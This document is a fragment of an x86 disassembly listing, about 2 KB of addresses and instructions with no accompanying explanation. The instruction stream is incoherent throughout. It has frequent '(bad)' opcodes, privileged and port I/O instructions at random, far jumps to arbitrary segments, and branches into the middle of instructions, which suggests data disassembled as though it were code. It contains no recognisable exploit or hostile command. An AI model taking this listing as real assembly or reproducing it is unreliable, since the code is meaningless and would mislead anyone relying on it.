  516235:	outs   dx,BYTE PTR ds:[esi]
  516236:	(bad)  
  516237:	loope  0x516224
  516239:	loopne 0x5161fc
  51623b:	cwde   
  51623c:	and    ah,BYTE PTR [edi-0x21]
  51623f:	mov    ebp,0x38775ab8
  516244:	fwait
  516245:	mov    dh,0xe5
  516247:	and    BYTE PTR [esi+0x52],dh
  51624a:	lds    eax,FWORD PTR [ecx+0x71b7975e]
  516250:	addr16 js 0x51624b
  516253:	add    cl,BYTE PTR [edi]
  516255:	jmp    0x393e:0x48f964f8
  51625c:	push   ss
  51625d:	ja     0x5161fb
  51625f:	xchg   ebx,eax
  516260:	or     BYTE PTR [ebp+0x41],ch
  516263:	ror    DWORD PTR [eax+0x674435e4],0x61
  51626a:	sbb    al,0xfa
  51626c:	and    dh,bl
  51626e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51626f:	push   es
  516270:	cdq    
  516271:	shr    BYTE PTR [ebp-0x6f],1
  516274:	out    dx,eax
  516275:	sub    dl,BYTE PTR [esi]
  516277:	fld    TBYTE PTR [eax-0xb]
  51627a:	icebp  
  51627b:	push   0x285b03d8
  516280:	inc    esp
  516281:	mov    ebx,0x2d3d0fd0
  516286:	adc    eax,0xa4db4fa3
  51628b:	mov    eax,0x41ad222e
  516290:	mov    esi,0x4e4017c
  516295:	call   0xb83756d9
  51629a:	test   DWORD PTR [edi+0x61],0x45299a5e
  5162a1:	(bad)  
  5162a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5162a3:	repnz fsubr DWORD PTR [eax-0x34]
  5162a7:	xchg   esi,eax
  5162a8:	mov    edi,esi
  5162aa:	out    dx,eax
  5162ab:	mov    ds:0x6bf6ac50,eax
  5162b0:	mov    ds:0x461ccbb,eax
  5162b5:	in     eax,0xf0
  5162b7:	retf   0x287c
  5162ba:	dec    esp
  5162bb:	cmp    dh,ch
  5162bd:	and    ah,cl
  5162bf:	fst    QWORD PTR [ebp+0x3df7bacf]
  5162c5:	enter  0x8346,0x2f
  5162c9:	fdivr  QWORD PTR [ebp+0x7a6e31d]
  5162cf:	cmp    eax,0x238fe966
  5162d4:	imul   ebx,DWORD PTR [ebx+0x1b],0xec2ad0f6
  5162db:	into   
  5162dc:	retf   0xff46
  5162df:	inc    ecx
  5162e0:	inc    edi
  5162e1:	aas    
  5162e2:	cs push ebx
  5162e4:	std    
  5162e5:	jge    0x516309
  5162e7:	retf   
  5162e8:	scas   ax,WORD PTR es:[edi]
  5162ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5162eb:	cmp    eax,0x50fa29c8
  5162f0:	sub    ah,BYTE PTR [edi*4-0x65dce18b]
  5162f7:	mov    dl,0x39
  5162f9:	jp     0x5162c2
  5162fb:	cmp    DWORD PTR [edx-0x5e577a83],esp
  516301:	and    eax,0x80a7eab6
  516306:	cmp    DWORD PTR [esi],ebp
  516308:	out    dx,eax
  516309:	xor    DWORD PTR [esi+0x56aa974d],edx
  51630f:	or     eax,0x76eb84a3
  516314:	fcom   DWORD PTR [edi+0x76196ed]
  51631a:	jge    0x51632f
  51631c:	repz push ebp
  51631e:	call   0x7d08:0x3758e798
  516325:	lods   eax,DWORD PTR ds:[esi]
  516326:	int    0xc0
  516328:	mov    dl,0xe
  51632a:	pop    ecx
  51632b:	cmp    ch,BYTE PTR [edi-0x4b5cc058]
  516331:	jae    0x516365
  516333:	cmp    eax,edx
  516335:	xchg   esi,eax
  516336:	jno    0x5162e5
  516338:	test   al,0x8c
  51633a:	stos   BYTE PTR es:[edi],al
  51633b:	xchg   ebp,eax
  51633c:	dec    ebp
  51633d:	(bad)  
  51633e:	xchg   edi,eax
  51633f:	cli    
  516340:	out    dx,al
  516341:	push   edx
  516342:	ret    0x3efe
  516345:	(bad)  
  516346:	and    DWORD PTR [ebx],esp
  516348:	mov    eax,gs
  51634a:	repz sub cl,BYTE PTR [ecx+ebx*1-0x1f]
  51634f:	inc    esp
  516350:	(bad)
  516353:	push   ecx
  516354:	je     0x516391
  516356:	popf   
  516357:	mov    ds:0xaacf81a7,al
  51635c:	push   ecx
  51635d:	and    eax,0x2977d9cb
  516362:	cmp    DWORD PTR [ebp+ebp*8-0x3d],ecx
  516366:	jae    0x5162f8
  516368:	mov    eax,ds:0x37ca870
  51636d:	xor    ebp,DWORD PTR [eax]
  51636f:	cs stc 
  516371:	pop    ss
  516372:	add    BYTE PTR [ecx+0x5bc2b02d],cl
  516378:	test   BYTE PTR [ecx+0x532e1491],bl
  51637e:	mov    ebp,0xe0ffbc69
  516383:	push   ecx
  516384:	inc    ebp
  516385:	in     al,0xc0
  516387:	retf   
  516388:	das    
  516389:	jne    0x51633d
  51638b:	adc    ecx,esi
  51638d:	adc    al,0xde
  51638f:	ret    0x897
  516392:	xchg   ebx,eax
  516393:	cld    
  516394:	mov    ebx,0x7f7918ff
  516399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51639a:	popf   
  51639b:	mov    ah,0x35
  51639d:	repz push ss
  51639f:	mov    ebp,0x7aed27e7
  5163a4:	call   0xeaa4:0x68417cf6
  5163ab:	mov    ecx,0xb052ca30
  5163b0:	mov    BYTE PTR [ecx+ebx*1+0x5cb0669b],bl
  5163b7:	dec    ecx
  5163b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5163b9:	outs   dx,BYTE PTR ds:[esi]
  5163ba:	cmc    
  5163bb:	scas   eax,DWORD PTR es:[edi]
  5163bc:	push   0x96ad1757
  5163c1:	sub    al,0x5e
  5163c3:	aaa    
  5163c4:	pop    esi
  5163c5:	jne    0x516381
  5163c7:	xor    al,0xee
  5163c9:	mov    esp,0xd2f1629f
  5163ce:	mov    al,ds:0x5b46cd9a
  5163d3:	and    bl,BYTE PTR [ebx+0x2]
  5163d6:	xchg   edx,eax
  5163d7:	jae    0x5163cc
  5163d9:	mov    esi,DWORD PTR [esi-0x7ad6418d]
  5163df:	lahf   
  5163e0:	shr    BYTE PTR [ecx],0x95
  5163e3:	out    0xf8,eax
  5163e5:	push   cs
  5163e6:	adc    edi,DWORD PTR [esi+0x6b78ff5b]
  5163ec:	clc    
  5163ed:	sbb    ebp,DWORD PTR [ecx-0x50450f]
  5163f3:	test   BYTE PTR [edx],dl
  5163f5:	jo     0x5163bd
  5163f7:	dec    esi
  5163f8:	push   edx
  5163f9:	inc    ebp
  5163fa:	mov    esp,0x388293c9
  5163ff:	sbb    eax,0xe852e3e1
  516404:	lock jne 0x5163ba
  516407:	jl     0x516434
  516409:	ja     0x51646b
  51640b:	int3   
  51640c:	ins    DWORD PTR es:[di],dx
  51640e:	mov    ds,WORD PTR [esi+0x76848e70]
  516414:	pushf  
  516415:	pop    ecx
  516416:	stc    
  516417:	fwait
  516418:	inc    eax
  516419:	in     al,0xac
  51641b:	xor    eax,0xc8c634f1
  516420:	in     eax,dx
  516421:	in     al,dx
  516422:	sub    BYTE PTR cs:[eax+0x34],dh
  516426:	jo     0x516439
  516428:	out    0x48,eax
  51642a:	xchg   BYTE PTR [esi],bh
  51642c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  51642e:	fcom   DWORD PTR [ecx+0x46]
  516431:	mov    DWORD PTR [esi+0x121dd004],esp
  516437:	mov    esp,0x97716af5
  51643c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51643d:	rol    DWORD PTR [ecx-0x1e],0xfd
  516441:	mov    esi,0x68223cdb
  516446:	mov    esi,esi
  516448:	inc    esp
  516449:	nop
  51644a:	jnp    0x51649e
  51644c:	cli    
  51644d:	mov    ecx,DWORD PTR [edx+0x36]
  516450:	in     eax,0xb7
  516452:	and    BYTE PTR [ebx-0x2d],dh
  516455:	fimul  WORD PTR [ebp-0x1435b098]
  51645b:	aas    
  51645c:	scas   eax,DWORD PTR es:[edi]
  51645d:	cld    
  51645e:	and    DWORD PTR [esi],eax
  516460:	js     0x516431
  516462:	loopne 0x516449
  516464:	clc    
  516465:	std    
  516466:	jmp    0x51646d
  516468:	mul    DWORD PTR [ebx+edi*2]
  51646b:	adc    al,0xc9
  51646d:	out    dx,al
  51646e:	not    BYTE PTR [edi+0x407a82ad]
  516474:	xchg   esp,eax
  516475:	cmp    eax,0x4730f4de
  51647a:	or     DWORD PTR [ebp-0x24],ecx
  51647d:	es out dx,al
  51647f:	pop    edi
  516480:	mov    eax,0xa198a322
  516485:	and    ah,BYTE PTR cs:[edi+0x7e0b592c]
  51648c:	(bad)  
  51648d:	mov    ds,WORD PTR [edi+0x57821d97]
  516493:	jne    0x51648b
  516495:	(bad)  
  516496:	dec    esi
  516497:	enter  0xa70b,0xda
  51649b:	xchg   BYTE PTR [edi-0x5d017a58],bh
  5164a1:	sar    BYTE PTR [edx],cl
  5164a3:	sbb    BYTE PTR [edx],bh
  5164a5:	lods   al,BYTE PTR ds:[esi]
  5164a6:	popf   
  5164a7:	push   cs
  5164a8:	cs push edx
  5164aa:	pop    ss
  5164ab:	popa   
  5164ac:	popf   
  5164ad:	inc    edx
  5164ae:	add    al,0x38
  5164b0:	enter  0xe523,0x4b
  5164b4:	push   ss
  5164b5:	shl    BYTE PTR [eax],0x61
  5164b8:	punpcklbw mm7,mm0
  5164bb:	mov    eax,ds:0xcf7b1f2c
  5164c0:	pop    eax
  5164c1:	adc    al,0x3c
  5164c3:	retf   
  5164c4:	ss sahf 
  5164c6:	adc    BYTE PTR [esp+edx*1],cl
  5164c9:	fst    QWORD PTR [edi-0x77]
  5164cc:	leave  
  5164cd:	mov    esp,0xa90fb591
  5164d2:	xchg   edx,eax
  5164d3:	iret   
  5164d4:	das    
  5164d5:	add    al,0x67
  5164d7:	pusha  
  5164d8:	fbld   TBYTE PTR [edi+0x1c]
  5164db:	jne    0x51648b
  5164dd:	fucomi st,st(0)
  5164df:	xchg   esi,eax
  5164e0:	(bad)  
  5164e1:	out    0x43,eax
  5164e3:	out    0xdc,eax
  5164e5:	dec    ecx
  5164e6:	add    BYTE PTR [edx+0x6c],ch
  5164e9:	push   ebp
  5164ea:	loope  0x51651a
  5164ec:	pop    edx
  5164ed:	out    dx,eax
  5164ee:	(bad)  
  5164ef:	test   eax,0x484cf736
  5164f4:	adc    al,0xa9
  5164f6:	(bad)  
  5164f7:	clts   
  5164f9:	inc    ebx
  5164fa:	sbb    eax,0x6fabb84
  5164ff:	test   BYTE PTR [edx+ebx*4-0x79],0x5c
  516504:	mov    dh,0xf3
  516506:	leave  
  516507:	adc    DWORD PTR [edx],ecx
  516509:	xor    esp,DWORD PTR [ecx+esi*4+0x24]
  51650d:	pushf  
  51650e:	mov    ah,0xe4
  516510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  516511:	mov    dh,0x30
  516513:	popa   
  516514:	test   edx,0xbc5ab0a9
  51651a:	inc    ecx
  51651b:	inc    ecx
  51651c:	imul   ebx,DWORD PTR [ebp-0x3b15ff66],0xffffff92
  516523:	lock pop ebx
  516525:	dec    edi
  516526:	fs sti 
  516528:	push   cs
  516529:	and    eax,0xf3f71abc
  51652e:	hlt    
  51652f:	stos   BYTE PTR es:[edi],al
  516530:	fbstp  TBYTE PTR gs:[eax]
  516533:	es pusha 
  516535:	push   0x24
  516537:	outs   dx,BYTE PTR ds:[esi]
  516538:	jp     0x5164fc
  51653a:	(bad)  
  51653b:	add    ebx,DWORD PTR es:[esi-0x12fd647e]
  516542:	xlat   BYTE PTR ds:[ebx]
  516543:	cld    
  516544:	loopne 0x5164ff
  516546:	fnstsw WORD PTR [ebx+0x10]
  516549:	push   ebp
  51654a:	mov    ecx,0xbc489f98
  51654f:	arpl   WORD PTR [edx],ax
  516551:	and    BYTE PTR [ecx-0x195b9dbf],dh
  516557:	dec    eax
  516558:	push   edi
  516559:	mov    edi,0xf30f4739
  51655e:	out    dx,eax
  51655f:	mov    edx,DWORD PTR [ebp-0x251876de]
  516565:	mov    dl,0x5f
  516567:	jo     0x5165e1
  516569:	cld    
  51656a:	out    0x8e,eax
  51656c:	inc    ebp
  51656d:	inc    edi
  51656e:	inc    ebx
  51656f:	out    dx,eax
  516570:	ret    0x123d
  516573:	dec    ecx
  516574:	cwde   
  516575:	(bad)  [esi+0x5f]
  516578:	mov    ds:0xd48fd0f8,al
  51657d:	gs push 0xbb157735
  516583:	adc    al,0x5c
  516585:	cld    
  516586:	retf   
  516587:	repz push 0xffffff9f
  51658a:	mov    bl,0x61
  51658c:	clc    
  51658d:	retf   0x188d
  516590:	add    BYTE PTR [ebx],dl
  516592:	aaa    
  516593:	add    al,0xe
  516595:	ret    0xa12d
  516598:	and    eax,ebp
  51659a:	jle    0x5165dc
  51659c:	jg     0x516605
  51659e:	pop    ecx
  51659f:	jge    0x516549
  5165a1:	add    BYTE PTR ds:0xd8c9451,ch
  5165a7:	sbb    bl,cl
  5165a9:	xchg   esp,eax
  5165aa:	loope  0x516622
  5165ac:	inc    ebp
  5165ad:	xchg   ebx,eax
  5165ae:	outs   dx,DWORD PTR ds:[esi]
  5165af:	loopne 0x51659e
  5165b1:	dec    esp
  5165b2:	pop    esi
  5165b3:	mov    bh,0x5b
  5165b5:	mov    esi,0x8356adc4
  5165ba:	pop    edx
  5165bb:	stos   DWORD PTR es:[edi],eax
  5165bc:	push   ss
  5165bd:	pop    eax
  5165be:	fnstcw WORD PTR [esi]
  5165c0:	test   ah,ch
  5165c2:	mov    al,ds:0x8aea8bad
  5165c7:	scas   eax,DWORD PTR es:[edi]
  5165c8:	ds mov dh,0xa9
  5165cb:	int    0xe0
  5165cd:	xchg   esp,eax
  5165ce:	icebp  
  5165cf:	cld    
  5165d0:	std    
  5165d1:	int3   
  5165d2:	and    DWORD PTR [eax],0xc622f210
  5165d8:	xchg   DWORD PTR [edx],ebx
  5165da:	fild   WORD PTR [edx+0x44]
  5165dd:	mov    ecx,0x1777ca62
  5165e2:	retf   0x5c6b
  5165e5:	leave  
  5165e6:	jo     0x5165e8
  5165e8:	jno    0x516594
  5165ea:	arpl   dx,di
  5165ec:	fsub   DWORD PTR [edi+0x77d7dc92]
  5165f2:	mov    dl,0xd6
  5165f4:	adc    ch,BYTE PTR [ecx]
  5165f6:	xor    DWORD PTR [edx+0x1fd30a01],esp
  5165fc:	cmp    bl,cl
  5165fe:	cmp    al,0xe3
  516600:	cs sub ch,al
  516603:	test   eax,0xf2b49be8
  516608:	push   ss
  516609:	ins    BYTE PTR es:[edi],dx
  51660a:	mov    ecx,0xc62c5f69
  51660f:	fild   QWORD PTR [ecx]
  516611:	loop   0x516630
  516613:	out    0x98,al
  516615:	lds    ebx,FWORD PTR [ebp+0x1f]
  516618:	push   0xfffffff3
  51661a:	pop    esp
  51661b:	mov    DWORD PTR [edx],ebx
  51661d:	lods   eax,DWORD PTR ds:[esi]
  51661e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51661f:	and    bl,bh
  516621:	pop    es
  516622:	push   0xf4f1215b
  516627:	xor    bl,bl
  516629:	pop    ss
  51662a:	rcr    BYTE PTR [esi+0x6e67f3ad],0x46
  516631:	retf   
  516632:	mov    ebp,0xc2e98dd8
  516637:	cmp    al,0x18
  516639:	lock adc BYTE PTR [ebp-0x34],0xd0
  51663e:	jae    0x516699
  516640:	dec    edx
  516641:	mov    esi,0x7ef42261
  516646:	lahf   
  516647:	and    esi,edx
  516649:	mov    edx,0xc08a6853
  51664e:	retf   0x4619
  516651:	xchg   BYTE PTR ds:0x240d659c,dl
  516657:	aad    0x27
  516659:	mov    bh,0x8a
  51665b:	aad    0x7a
  51665d:	ret    0xb53d
  516660:	lahf   
  516661:	out    dx,al
  516662:	jb     0x516675
  516664:	sbb    DWORD PTR [ebx-0x153ec40e],ebx
  51666a:	mov    ch,0x19
  51666c:	mov    ss,edx
  51666e:	dec    edx
  51666f:	call   0xc711a932
  516674:	das    
  516675:	pop    es
  516676:	or     al,BYTE PTR [ebp+0x43]
  516679:	pushf  
  51667a:	adc    BYTE PTR [ecx],ah
  51667c:	repnz int3 
  51667e:	xor    dl,dh
  516680:	xor    eax,0xfd78f26d
  516685:	mov    ebp,0x65e81c04
  51668a:	inc    ecx
  51668b:	jp     0x5166b8
  51668d:	push   eax
  51668e:	scas   al,BYTE PTR es:[edi]
  51668f:	jne    0x5166b6
  516691:	and    eax,DWORD PTR [ecx+edx*1+0x5]
  516695:	inc    eax
  516696:	pop    esi
  516697:	and    dl,ah
  516699:	jb     0x516638
  51669b:	sub    ecx,esi
  51669d:	lods   al,BYTE PTR ds:[esi]
  51669e:	scas   al,BYTE PTR es:[edi]
  51669f:	out    0xd5,al
  5166a1:	gs stc 
  5166a3:	mov    bh,0x7b
  5166a5:	cs and eax,0x288be75d
  5166ab:	xchg   BYTE PTR [edx+0x5f],dh
  5166ae:	int3   
  5166af:	and    al,0xf8
  5166b1:	xor    DWORD PTR [edx-0x12],edx
  5166b4:	add    ch,0xda
  5166b7:	xchg   ebp,eax
  5166b8:	int3   
  5166b9:	cli    
  5166ba:	lock mov ah,0xdb
  5166bd:	in     al,0x1d
  5166bf:	lea    esi,[ebx]
  5166c1:	rcl    BYTE PTR [esi+0x5096fd9f],cl
  5166c7:	loope  0x516695
  5166c9:	test   DWORD PTR [eax-0x37],esi
  5166cc:	shl    DWORD PTR [edx+0x5616aaab],1
  5166d2:	shl    BYTE PTR [esp+edx*4],1
  5166d5:	fnstsw WORD PTR [ecx]
  5166d7:	sub    bh,dh
  5166d9:	push   ecx
  5166da:	pop    es
  5166db:	repz fidivr WORD PTR [ebx+0x5dcd8973]
  5166e2:	push   ss
  5166e3:	hlt    
  5166e4:	pop    eax
  5166e5:	ja     0x516694
  5166e7:	call   0xbf4a8712
  5166ec:	cmovg  edx,DWORD PTR [ecx+0x2f]
  5166f0:	sahf   
  5166f1:	pop    ebx
  5166f2:	lea    ebx,[ebx-0x74]
  5166f5:	(bad)  
  5166f6:	ins    DWORD PTR es:[edi],dx
  5166f7:	dec    ecx
  5166f8:	xor    BYTE PTR [eax+edi*1-0x3e],bl
  5166fc:	mov    bh,0xdb
  5166fe:	dec    esi
  5166ff:	mov    ch,0xfa
  516701:	ins    BYTE PTR es:[edi],dx
  516702:	pop    es
  516703:	mul    al
  516705:	mov    ds:0x6f20b9ac,al
  51670a:	mov    ebx,eax
  51670c:	cmp    BYTE PTR [ebx-0x71],ah
  51670f:	mov    cl,0xd7
  516711:	sahf   
  516712:	add    al,0x78
  516714:	das    
  516715:	push   esi
  516716:	je     0x516704
  516718:	jl     0x516715
  51671a:	dec    esp
  51671b:	aad    0xcb
  51671d:	fwait
  51671e:	in     al,0xc4
  516720:	jge    0x516713
  516722:	std    
  516723:	aas    
  516724:	mov    cl,BYTE PTR ss:[ecx-0x5b]
  516728:	fstp   QWORD PTR [edx+ecx*1]
  51672b:	inc    ebx
  51672c:	sub    al,0x89
  51672f:	push   ds
  516730:	pushf  
  516731:	rol    DWORD PTR [esi-0x23],0xd4
  516735:	xor    ebx,esi
  516737:	jnp    0x51672d
  516739:	cld    
  51673a:	pop    edi
  51673b:	mov    esi,0x5d16c70a
  516740:	cmp    al,0x34
  516742:	repz in eax,dx
  516744:	jl     0x51679a
  516746:	cmp    edx,DWORD PTR [ebx-0x5078ef19]
  51674c:	bound  edi,QWORD PTR [esi-0x308f7d9b]
  516752:	sub    esi,ebp
  516754:	and    eax,0x60afe9f2
  516759:	(bad)  
  51675a:	adc    edx,DWORD PTR ds:0x28dbfc7e
  516760:	pop    ecx
  516761:	push   ss
  516762:	mov    cl,BYTE PTR [edx-0x5b446c77]
  516768:	clc    
  516769:	bound  ecx,QWORD PTR [ebx+eax*4-0x60eb9caf]
  516770:	ins    BYTE PTR es:[edi],dx
  516771:	jle    0x516779
  516773:	retf   0x8aae
  516776:	inc    esi
  516777:	cs inc ebx
  516779:	and    BYTE PTR [esi-0x2e],dh
  51677c:	mov    al,ds:0x12ccfdc1
  516781:	cld    
  516782:	cmp    edi,DWORD PTR [ebx+ebp*1+0x2c]
  516786:	mov    ch,0xb0
  516788:	pop    es
  516789:	xor    ch,BYTE PTR [eax]
  51678b:	cmp    BYTE PTR [ebp-0x207f5ceb],al
  516791:	shl    BYTE PTR [ebx-0x36],cl
  516794:	ret    
  516795:	cmp    DWORD PTR [edi],ecx
  516797:	and    eax,ecx
  516799:	jl     0x516808
  51679b:	mov    eax,ds:0xbd1b9ccb
  5167a0:	outs   dx,DWORD PTR ds:[esi]
  5167a1:	push   ebx
  5167a2:	mov    esi,0xa7621cd7
  5167a7:	add    BYTE PTR [ebx+0x5a],ch
  5167aa:	mov    eax,0xd1b3d019
  5167af:	jbe    0x516809
  5167b1:	or     edx,DWORD PTR [ecx-0x2c122e37]
  5167b7:	mov    ds:0x9a0af3ed,al
  5167bc:	mov    cl,0xd
  5167be:	pop    edx
  5167bf:	mov    ah,0x89
  5167c1:	mov    esi,0xc8864d82
  5167c6:	lea    eax,es:0xcdac7a47
  5167cd:	dec    esi
  5167ce:	mov    ds:0x80102be8,al
  5167d3:	jmp    0x62220e3b
  5167d8:	iret   
  5167d9:	psubsw mm3,QWORD PTR [ebx-0x273e07c6]
  5167e0:	in     al,0x18
  5167e2:	leave  
  5167e3:	(bad)  
  5167e4:	mov    eax,ds:0x187bbacf
  5167e9:	aaa    
  5167ea:	push   es
  5167eb:	push   eax
  5167ec:	mov    ecx,0x571e0b50
  5167f1:	cli    
  5167f2:	inc    eax
  5167f3:	scas   al,BYTE PTR es:[edi]
  5167f4:	jecxz  0x516809
  5167f6:	fwait
  5167f7:	(bad)  
  5167f8:	mov    ebp,0x6e2171f9
  5167fd:	arpl   WORD PTR [edx-0x890bf6d],bp
  516803:	push   0xa
  516805:	es sub eax,0xd049bb
  51680b:	xchg   DWORD PTR [ebx],esp
  51680d:	mov    eax,ds:0x9d376b13
  516812:	arpl   WORD PTR [edi],bp
  516814:	push   ds
  516815:	xchg   esp,eax
  516816:	xor    eax,0xa815f1a1
  51681b:	and    DWORD PTR [ebp-0x77],ebx
  51681e:	mov    eax,0x3189907b
  516823:	(bad)  
  516824:	idiv   BYTE PTR [esi+0x7c]
  516827:	sbb    al,0xdf
  516829:	fsub   DWORD PTR [edi]
  51682b:	(bad)  
  51682c:	idiv   DWORD PTR [edi]
  51682e:	icebp  
  51682f:	jo     0x5168af
  516831:	imul   DWORD PTR ss:[eax]
  516834:	out    0x55,eax
  516836:	dec    ecx
  516837:	jb     0x516872
  516839:	cmc    
  51683a:	(bad)  
  51683c:	inc    ecx
  51683d:	mov    bh,BYTE PTR [ecx-0x3f]
  516840:	inc    ebx
  516841:	out    0x99,eax
  516843:	data16 rcr BYTE PTR [esi],1
  516846:	mov    ebx,0x65197b9e
  51684b:	xor    ecx,eax
  51684d:	push   edx
  51684e:	inc    ecx
  51684f:	das    
  516850:	pop    fs
  516852:	cmp    edx,DWORD PTR [ecx]
  516854:	popa   
  516855:	xchg   esp,edi
  516857:	mov    ah,0xa4
  516859:	mov    esp,0xe1463e05
  51685e:	push   eax
  51685f:	fbstp  TBYTE PTR [ebp-0x42]
  516862:	and    al,0x6d
  516864:	ja     0x51683d
  516866:	mov    ah,dl
  516868:	mov    dh,0xfd
  51686a:	sub    BYTE PTR [ebx+0x1e],cl
  51686d:	mov    WORD PTR [ecx],es
  51686f:	test   DWORD PTR [edi-0x77],esp
  516872:	fild   WORD PTR [esi+edx*4]
  516875:	dec    ebp
  516876:	push   ebp
  516877:	add    esp,DWORD PTR ds:0xc71ff871
  51687d:	retf   
  51687e:	add    DWORD PTR [eax],eax
  516880:	(bad)  
  516881:	fincstp 
  516883:	mov    ch,BYTE PTR [edi+0x49]
  516886:	xchg   edi,eax
  516887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  516888:	(bad)  
  516889:	cmp    edx,DWORD PTR [edx-0x7b]
  51688c:	mov    esp,0x7b3e6697
  516891:	ja     0x516872
  516893:	sbb    DWORD PTR [ebx+0x2e],ebp
  516896:	cmp    BYTE PTR [ecx+edi*1+0x2e],dh
  51689a:	push   ss
  51689b:	fdivr  DWORD PTR [esi]
  51689d:	lds    ebx,FWORD PTR [eax-0x34]
  5168a0:	lea    edi,[eax-0x72e6f624]
  5168a6:	enter  0xbd33,0xd4
  5168aa:	sub    BYTE PTR [esp],bl
  5168ad:	jp     0x5168f1
  5168af:	fisub  WORD PTR es:[edx+0x53]
  5168b3:	mov    ch,0xcf
  5168b5:	mov    dl,0xeb
  5168b7:	jmp    0xaecfc64d
  5168bc:	mov    eax,ds:0xe247691f
  5168c1:	cli    
  5168c2:	icebp  
  5168c3:	mov    ds:0xc88b71cb,eax
  5168c9:	mov    edi,0x7655b6dd
  5168ce:	ja     0x5168b5
  5168d0:	xlat   BYTE PTR es:[ebx]
  5168d2:	neg    ah
  5168d4:	aam    0x2a
  5168d6:	nop
  5168d7:	aad    0xd4
  5168d9:	push   edx
  5168da:	arpl   si,ax
  5168dc:	imul   ch
  5168de:	aaa    
  5168df:	dec    ecx
  5168e0:	sbb    DWORD PTR [eax+ebx*4-0x73],ecx
  5168e4:	adc    esp,eax
  5168e6:	fwait
  5168e7:	addr16 mov esi,0x77be9c2e
  5168ed:	cmc    
  5168ee:	sar    bh,0xe5
  5168f1:	dec    ebx
  5168f2:	jge    0x51696d
  5168f4:	add    DWORD PTR [edx-0x2d23ac22],0x78ef5a88
  5168fe:	jne    0x51695b
  516900:	mov    ds:0x20b8f7fd,eax
  516905:	test   BYTE PTR ds:0x67d9d1da,ah
  51690b:	sbb    ebx,DWORD PTR [ebx-0x75]
  51690e:	push   0x6f404270
  516913:	test   al,0x86
  516915:	mov    bh,0x56
  516917:	dec    ebx
  516918:	(bad)
  51691c:	and    eax,0x5e66ebcb
  516921:	xchg   edi,eax
  516922:	xor    al,0x0
  516924:	loope  0x5168b0
  516926:	imul   ebx,DWORD PTR [ebx+eiz*1],0xffffffba
  51692a:	sbb    edx,DWORD PTR [esi-0x22926696]
  516930:	sbb    bh,BYTE PTR [eax]
  516932:	jns    0x5169a7
  516934:	aam    0x94
  516936:	xor    BYTE PTR ds:0xc388f372,0xf5
  51693d:	out    0xef,al
  51693f:	mov    bh,0x81
  516941:	fild   DWORD PTR [ecx-0x6d419dc1]
  516947:	(bad)  
  516948:	xchg   ebx,eax
  516949:	leave  
  51694a:	adc    ebx,DWORD PTR [edx+0x211f6031]
  516950:	sub    al,0xd5
  516952:	jae    0x51695f
  516954:	xor    eax,0xd2e93367
  516959:	outs   dx,BYTE PTR ds:[esi]
  51695a:	nop
  51695b:	push   edx
  51695c:	mov    ds:0xe6e43f,al
  516961:	or     BYTE PTR [edi+0x4a],0xe5
  516965:	cld    
  516966:	inc    esi
  516967:	inc    edx
  516968:	outs   dx,DWORD PTR ds:[esi]
  516969:	jl     0x516959
  51696b:	out    dx,eax
  51696c:	lods   al,BYTE PTR ds:[esi]
  51696d:	jge    0x51697b
  51696f:	xor    DWORD PTR [edi-0xa],0x1a
  516973:	sbb    cl,BYTE PTR [ecx-0x43de76c2]
  516979:	mov    esi,DWORD PTR [edx+0x4]
  51697c:	lea    ebx,[edi+eax*8-0x5cbd7f91]
  516983:	xor    eax,0x1e670def
  516988:	(bad)  
  516989:	xor    BYTE PTR [edi],ch
  51698b:	mov    bh,0x52
  51698d:	fsubr  st,st(7)
  51698f:	pop    ebp
  516990:	xchg   esp,eax
  516991:	dec    eax
  516992:	(bad)  es:[edx+0x6178088]
  516999:	scas   al,BYTE PTR es:[edi]
  51699a:	pusha  
  51699b:	xor    BYTE PTR [ebp-0x7b722a70],dh
  5169a1:	add    eax,0xb3f3ac22
  5169a6:	or     al,0x6b
  5169a8:	stc    
  5169a9:	fsub   QWORD PTR [ebp-0xf]
  5169ac:	rcr    ch,1
  5169ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5169af:	add    eax,DWORD PTR [esi]
  5169b1:	rol    DWORD PTR [eax-0x60],cl
  5169b4:	rcl    BYTE PTR [eax-0x59],1
  5169b7:	fwait
  5169b8:	push   cs
  5169b9:	dec    edi
  5169ba:	dec    eax
  5169bb:	call   0xffa846f2
  5169c0:	mov    ebp,0xa6ad875e
  5169c5:	jl     0x5169c7
  5169c7:	fstp   DWORD PTR [edi+eax*2-0x191ac97b]
  5169ce:	cli    
  5169cf:	(bad)  
  5169d0:	mov    ds:0xef094785,al
  5169d5:	leave  
  5169d6:	in     al,dx
  5169d7:	outs   dx,DWORD PTR ds:[esi]
  5169d8:	in     eax,dx
  5169d9:	push   ds
  5169da:	lods   al,BYTE PTR ds:[esi]
  5169db:	(bad)  
  5169dc:	add    esi,DWORD PTR [ecx]
  5169de:	sahf   
  5169df:	inc    ecx
  5169e0:	push   edx
  5169e1:	int    0xa9
  5169e3:	call   0xbe10:0x62fec04b
  5169ea:	outs   dx,BYTE PTR ds:[esi]
  5169eb:	sbb    BYTE PTR [eax+0x43],al
  5169ee:	jns    0x5169d8
  5169f0:	pop    ebp
  5169f1:	mov    dh,BYTE PTR [esi]
  5169f3:	mov    eax,ds:0xd116c56d
  5169f8:	mov    ds:0xa8587c77,al
  5169fd:	xor    eax,0xdb93ac7f
  516a02:	inc    edi
  516a03:	aaa    
  516a04:	jmp    0x8e99:0x8afb7d94
  516a0b:	push   ebx
  516a0c:	push   esp
  516a0d:	leave  
  516a0e:	sub    al,0x98
  516a10:	xchg   eax,esi
  516a12:	pop    ebx
  516a13:	sbb    DWORD PTR [eax],0x31e73bb9
  516a19:	jle    0x516a88
  516a1b:	sahf   
  516a1c:	xchg   ebp,eax
  516a1d:	xor    BYTE PTR [edi-0x27ff7f0b],ah
  516a23:	ss pushf 
  516a25:	addr16 retf 0x157d
  516a29:	add    BYTE PTR [eax],cl
  516a2b:	jle    0x5169b1
  516a2d:	inc    ebx
